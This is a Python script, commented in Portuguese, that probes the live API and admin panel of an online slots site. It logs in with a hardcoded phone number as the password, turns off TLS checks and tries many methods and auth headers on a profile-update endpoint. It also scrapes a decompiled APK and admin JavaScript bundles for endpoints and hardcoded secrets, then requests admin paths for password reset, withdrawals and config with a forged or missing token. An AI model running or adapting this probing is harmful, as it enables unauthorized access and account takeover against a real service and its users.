"""
Investigação focada em dois vetores:
1. Por que player/update expira imediatamente (mesmo com token fresquíssimo)
2. Busca de endpoint de reset/troca de senha no APK descompilado
"""
import re, json, ssl, urllib.request, urllib.error, time, os

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

BASE  = "https://ds.amizade777.com"
PHONE = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"
PKG   = "com.slots.big"

def raw_call(method, url, body=None, token=None, extra_headers=None, raw_body=None):
    """Chama e retorna status, headers, raw string."""
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json, */*",
         "Origin":BASE,"Referer":BASE+"/"}
    if token is not None: h["Token"] = str(token)
    if body is not None: h["Content-Type"] = "application/json"
    if extra_headers: h.update(extra_headers)
    data = raw_body if raw_body else (json.dumps(body).encode() if body is not None else None)
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read(8192).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        return e.code, {}, e.read(4096).decode("utf-8","ignore") if e.fp else ""
    except Exception as ex:
        return 0, {}, str(ex)

# ─── PARTE 1: Diagnóstico do player/update ──────────────────────

print("="*60)
print("PARTE 1 — DIAGNÓSTICO DO player/update")
print("="*60)

login_payload = {
    "appChannel":"pc","appPackageName":PKG,"deviceId":DID,
    "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0",
    "sysTimezone":None,"sysLanguage":None,
    "phone":PHONE,"password":PHONE
}

# Passo 1: login e inspecionar os campos COMPLETOS da response
st, _, raw = raw_call("POST", BASE+"/prod-api/player/sign-in", login_payload)
j = json.loads(raw)
print(f"Login code={j.get('code')}")
token = j["data"]["token"]
user_info = j["data"]["user_info"]

# Inspecionar: o login retorna algum campo extra de sessão?
print("\nCampos completos do data:")
for k, v in j["data"].items():
    if k != "user_info":
        print(f"  {k}: {str(v)[:100]}")
print("\nCampos do user_info:")
for k, v in user_info.items():
    print(f"  {k}: {str(v)[:80]}")

# Agora testar /prod-api/player/update com o token EM TEMPO REAL
# (sem nenhum sleep, sem processar nada)
print(f"\nToken: {token}")
print("Testando player/update AGORA (sem sleep)...")
st2, _, raw2 = raw_call("POST", BASE+"/prod-api/player/update",
                         {"nickname": f"G{137027}"}, token)
j2 = json.loads(raw2) if raw2 else {}
print(f"  code={j2.get('code')} msg={j2.get('msg')!r}")

# Talvez o endpoint precise de campos adicionais do login?
# Tentar com token no body também (como faz o sign-in original)
print("\nTestando com token TAMBÉM no body...")
st3, _, raw3 = raw_call("POST", BASE+"/prod-api/player/update",
                         {"token": token, "nickname": f"G{137027}"}, token)
j3 = json.loads(raw3) if raw3 else {}
print(f"  code={j3.get('code')} msg={j3.get('msg')!r}")

# Talvez o endpoint aceite o formato do APK (com appPackageName etc)
print("\nTestando com payload completo estilo APK...")
full_payload = {
    "token": token,
    "nickname": f"G{137027}",
    "appPackageName": PKG,
    "appVersion": "1.0.0",
    "appChannel": "pc",
    "deviceId": DID,
    "deviceModel": "WEB",
    "deviceVersion": "WEB",
    "phone": PHONE,
}
st4, _, raw4 = raw_call("POST", BASE+"/prod-api/player/update", full_payload, token)
j4 = json.loads(raw4) if raw4 else {}
print(f"  code={j4.get('code')} msg={j4.get('msg')!r}")

# Talvez seja PUT (o método HTTP)
print("\nTestando PUT /prod-api/player/update...")
st5, _, raw5 = raw_call("PUT", BASE+"/prod-api/player/update",
                          {"nickname": f"G{137027}"}, token)
j5 = json.loads(raw5) if raw5 else {}
print(f"  code={j5.get('code')} msg={j5.get('msg')!r}")

# Tentar PATCH também
print("\nTestando PATCH /prod-api/player/update...")
st6, _, raw6 = raw_call("PATCH", BASE+"/prod-api/player/update",
                          {"nickname": f"G{137027}"}, token)
j6 = json.loads(raw6) if raw6 else {}
print(f"  code={j6.get('code')} msg={j6.get('msg')!r}")

# E se usar o token no header mas com o campo "token" do formato original?
print("\nTestando com header Xtoken diferente...")
for header_name in ["token","X-Token","x-token","Authorization","auth","access-token"]:
    h_extra = {header_name: token}
    if header_name == "Authorization":
        h_extra[header_name] = f"Bearer {token}"
    st7, _, raw7 = raw_call("POST", BASE+"/prod-api/player/update",
                              {"nickname":f"G{137027}"}, extra_headers=h_extra)
    j7 = json.loads(raw7) if raw7 else {}
    c7 = j7.get("code")
    if c7 not in (None, 400, 401, 403, 404, 405, 500):
        print(f"  [{header_name}] code={c7} msg={j7.get('msg')!r}")
    elif c7 == 200:
        print(f"  [{header_name}] 🔴 code={c7} ACEITO!")

# ─── PARTE 2: APK descompilado — buscar endpoints ───────────────

print("\n"+"="*60)
print("PARTE 2 — APK DESCOMPILADO (busca de endpoints)")
print("="*60)

apk_dirs = ["apk_extracted"]
for d in apk_dirs:
    if not os.path.isdir(d):
        continue
    for root, dirs, files in os.walk(d):
        for fname in files:
            fp = os.path.join(root, fname)
            try:
                with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(50000)
            except:
                continue
            # Procurar paths de API
            matches = re.findall(r'(/(?:prod-api|japi|api)/[A-Za-z0-9/_\-\.]{4,80})', content)
            if matches:
                print(f"\n  {fp}:")
                for m in sorted(set(matches)):
                    print(f"    {m}")

# ─── PARTE 3: Bundle pa — buscar endpoints de reset ─────────────

print("\n"+"="*60)
print("PARTE 3 — PA BUNDLE — endpoints que o bundle tem mas ainda não testamos")
print("="*60)

pa_bundles = [f"pa_bundles/{x}" for x in os.listdir("pa_bundles") if x.endswith(".js")]
all_pa_paths = set()
for fp in pa_bundles:
    try:
        with open(fp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        for m in re.finditer(r'["\']((/?(?:prod-api|japi|api|system|invite|user|admin|player|finance)[A-Za-z0-9/_\-\.]{3,80}))["\']', content):
            p = m.group(1)
            if not p.startswith("/"): p = "/" + p
            all_pa_paths.add(p)
        # baseURL e env
        for m in re.finditer(r'(?:baseURL|BASE_URL|VUE_APP[A-Z_]*)\s*[:=]\s*["\`]([^"\`\n]{3,100})["\`]', content):
            print(f"  ENV: {m.group(0)[:100]}")
        # Tokens hardcoded e secrets
        for m in re.finditer(r'(?:token|secret|key|auth)\s*[:=]\s*["\']([^"\']{8,60})["\']', content, re.I):
            val = m.group(1)
            if val not in ("undefined","null","","bearer","Bearer") and not val.startswith("http"):
                print(f"  [HARDCODED] {m.group(0)[:100]!r}")
    except Exception as ex:
        print(f"  [ERRO {fp}]: {ex}")

print(f"\nTotal paths do PA: {len(all_pa_paths)}")
for p in sorted(all_pa_paths)[:60]:
    print(f"  {p}")

# Testar os paths do PA que contêm user/player/finance
pa_interesting = [p for p in all_pa_paths
                  if any(k in p.lower() for k in
                         ("player","finance","recharge","withdraw","user/list","user/info",
                          "password","reset","phone","admin","config","setting"))]
if pa_interesting:
    print(f"\nTestando {len(pa_interesting)} paths interessantes do PA...")
    for path in pa_interesting:
        st1, _, raw1 = raw_call("GET", f"https://pa.rainha777slots.com{path}", token=1)
        try: b1 = json.loads(raw1)
        except: b1 = {"_raw": raw1[:100]}
        c1 = b1.get("code") if isinstance(b1,dict) else None
        st0, _, raw0 = raw_call("GET", f"https://pa.rainha777slots.com{path}")
        try: b0 = json.loads(raw0)
        except: b0 = {"_raw": raw0[:100]}
        c0 = b0.get("code") if isinstance(b0,dict) else None
        if c1 == 200 and b1.get("data") is not None:
            print(f"  🔴 GET {path}")
            print(f"    data={json.dumps(b1['data'], ensure_ascii=False)[:400]}")
        elif c1 not in (None, 400, 401, 403, 404, 405, 500):
            print(f"  🔵 GET {path} c1={c1} c0={c0}")
        time.sleep(0.4)
